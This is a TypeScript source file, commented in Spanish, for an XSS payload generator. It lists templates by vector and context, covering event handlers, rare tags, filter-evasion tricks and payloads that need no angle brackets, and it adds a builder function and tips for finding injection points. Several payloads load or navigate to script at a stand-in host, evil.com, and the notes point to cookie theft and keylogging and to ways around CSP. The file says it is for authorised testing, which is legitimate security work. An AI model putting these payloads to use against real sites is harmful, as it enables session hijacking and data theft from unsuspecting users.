/* Generador de payloads XSS: plantillas organizadas por vector, eventos,
   etiquetas menos comunes y trucos de evasión de filtros. Solo para
   testear aplicaciones propias o con autorización. */

export type XsContext = 'html' | 'attr' | 'js' | 'url' | 'css'

export interface XsTemplate {
  id: string
  payload: string
  vector: 'básico' | 'evento' | 'etiqueta rara' | 'evasión' | 'sin <' | 'mDNS/edge'
  desc: string
  contexts: XsContext[]
  needsUserInteraction?: boolean
}

export const XS_TEMPLATES: XsTemplate[] = [
  // básicos de confirmación
  { id: 'alert1', payload: '<script>alert(1)</script>', vector: 'básico', desc: 'el clásico: demuestra ejecución directa', contexts: ['html'] },
  { id: 'alertsrc', payload: '<script src=//evil.com/x.js></script>', vector: 'básico', desc: 'carga script externo (sin protocolo: hereda http/https)', contexts: ['html'] },
  { id: 'imgonerror', payload: '<img src=x onerror=alert(1)>', vector: 'evento', desc: 'el más fiable: img con src roto dispara onerror siempre', contexts: ['html'] },
  { id: 'svgload', payload: '<svg onload=alert(1)>', vector: 'evento', desc: 'svg no suele estar en blacklists básicas', contexts: ['html'] },
  { id: 'bodyload', payload: '<body onload=alert(1)>', vector: 'evento', desc: 'si el body se inyecta completo', contexts: ['html'] },
  { id: 'details', payload: '<details ontoggle=alert(1) open>', vector: 'evento', desc: 'ontoggle dispara al renderizar con open', contexts: ['html'] },
  { id: 'video', payload: '<video><source onerror=alert(1)>', vector: 'evento', desc: 'sin audio/video válido → error', contexts: ['html'] },
  { id: 'marquee', payload: '<marquee onstart=alert(1)>XSS</marquee>', vector: 'etiqueta rara', desc: 'marquee sigue viva y nadie la filtra', contexts: ['html'] },
  { id: 'styleon', payload: '<style onload=alert(1)></style>', vector: 'evento', desc: 'style admite onload en navegadores modernos', contexts: ['html'] },

  // evasión
  { id: 'case', payload: '<ScRiPt>alert(1)</sCrIpT>', vector: 'evasión', desc: 'case-insensitive: rompe blacklists que buscan <script> literal', contexts: ['html'] },
  { id: 'tab', payload: '<img/src=x/onerror=alert(1)>', vector: 'evasión', desc: 'barra en vez de espacio: rompe regex de atributos', contexts: ['html'] },
  { id: 'newline', payload: '<a\nhref="javascript:alert(1)">click</a>', vector: 'evasión', desc: 'salto de línea dentro de la etiqueta', contexts: ['html'] },
  { id: 'enc', payload: '<img src=x onerror=&#97;lert(1)>', vector: 'evasión', desc: 'entidad HTML en el atributo: el navegador decodifica antes de ejecutar', contexts: ['attr'] },
  { id: 'doubleenc', payload: '<a href="javascript&#58;alert(1)">x</a>', vector: 'evasión', desc: 'dos puntas de decodificación: href sanitizado mal + decodificación', contexts: ['attr'] },
  { id: 'nosemi', payload: '<svg/onload=alert(1)//', vector: 'evasión', desc: 'sin cierre: el parser lo recupera', contexts: ['html'] },
  { id: 'unicode', payload: '<script>\u0061lert(1)</script>', vector: 'evasión', desc: 'unicode escape dentro de JS', contexts: ['js'] },
  { id: 'throw', payload: '<script>onerror=alert;throw 1</script>', vector: 'evasión', desc: 'sin paréntesis: asigna alert como handler de error', contexts: ['js'] },

  // sin angle brackets (contexts de atributo/JS)
  { id: 'autofocus', payload: '" autofocus onfocus=alert(1) x="', vector: 'sin <', desc: 'inyección en atributo value: roba el foco y ejecuta', contexts: ['attr'] },
  { id: 'onmouseover', payload: '" onmouseover=alert(1) x="', vector: 'sin <', desc: 'requiere hover pero rompe contexts de atributo', contexts: ['attr'], needsUserInteraction: true },
  { id: 'jsurl', payload: 'javascript:alert(1)', vector: 'sin <', desc: 'si el input acaba en href/action/src directamente', contexts: ['url'] },
  { id: 'dataurl', payload: 'data:text/html,<script>alert(1)</script>', vector: 'sin <', desc: 'data: URL con HTML (en href, no en src de img)', contexts: ['url'] },
  { id: 'jsbreak', payload: '\';alert(1)//', vector: 'sin <', desc: 'escape de string JS: cierra la cadena, ejecuta, comenta el resto', contexts: ['js'] },
  { id: 'jstemplate', payload: '${alert(1)}', vector: 'sin <', desc: 'template literal: si el input entra en `...` sin escapar', contexts: ['js'] },

  // edge cases modernos
  { id: 'import', payload: '<script>import("//evil.com/x.js")</script>', vector: 'básico', desc: 'dynamic import: bypasea CSP que solo permite self si no valida paths', contexts: ['html'] },
  { id: 'topnav', payload: '<a href=# onclick="top.location=//evil.com">click</a>', vector: 'evento', desc: 'navigation del top window (clickjacking inverso)', contexts: ['html'], needsUserInteraction: true },
  { id: 'genshin', payload: '<xss id=x tabindex=1 onactivate=alert(1)></xss><body onload=x.focus()>', vector: 'etiqueta rara', desc: 'elemento custom + focus: ejecuta sin etiquetas estándar', contexts: ['html'] },
]

export const XS_CONTEXT_INFO: Record<XsContext, { label: string; hint: string }> = {
  html: { label: 'HTML body', hint: 'el input acaba interpretado como etiquetas' },
  attr: { label: 'Atributo', hint: 'el input cae dentro de un atributo (value="...", href="...")' },
  js: { label: 'JS string', hint: 'el input cae dentro de un <script> o string JS' },
  url: { label: 'URL/href', hint: 'el input se usa como URL directamente' },
  css: { label: 'CSS', hint: 'el input acaba en un contexto de estilos (expression() ya no funciona)' },
}

/** Sustituye marcadores con el objetivo y decora según contexto. */
export function buildXs(t: XsTemplate, opts: { alertText: string; encode: 'nada' | 'url' | 'html'; wrap: boolean }): string {
  let p = t.payload.replace(/alert\(1\)/g, `alert(${JSON.stringify(opts.alertText)})`)
  if (opts.encode === 'url') p = encodeURIComponent(p)
  if (opts.encode === 'html') p = p.replace(/</g, '&lt;').replace(/>/g, '&gt;')
  if (opts.wrap) p = `<!-- prueba autorizada -->\n${p}\n<!-- fin -->`
  return p
}

export const XS_NOTES: string[] = [
  'Cada payload es para PROBAR tus propias apps o con autorización expresa: inyectar XSS en terceros es delito en todas las jurisdicciones.',
  'alert(1) demuestra ejecución pero el impacto real es: robo de cookies (document.cookie), keylogging, phishing in-place o acciones en nombre del usuario.',
  'El CONTEXTO manda: un payload de HTML no funciona dentro de un atributo y viceversa — mira primero dónde cae tu input en el DOM.',
  'Con CSP activo, la mayoría de estos no corren: prueba script-src unsafe-inline, JSONP heredado, o angular.js viejo en CDN (lstg = template injection).',
  'En atributos, prueba primero cerrar la comilla: si el valor se rompe visualmente, tienes contexto attr.',
]

export const XS_HUNT: [string, string][] = [
  ['¿dónde refleja mi input?', 'busca el parámetro en la respuesta HTML (Ctrl+U), mira si sale tal cual o encodeado'],
  ['¿qué contexto es?', 'antes del punto de inyección hay ¿etiqueta abierta? ¿comilla de atributo? ¿dentro de <script>?'],
  ['¿hay filtrado?', 'prueba <svg xss> y onerror= en minúsculas: si los reescribe hay sanitizer (DOMPurify etc.)'],
  ['¿CSP?', 'mira la cabecera: script-src self sin unsafe-inline cierra la vía directa pero quizá no la de base64/data'],
]
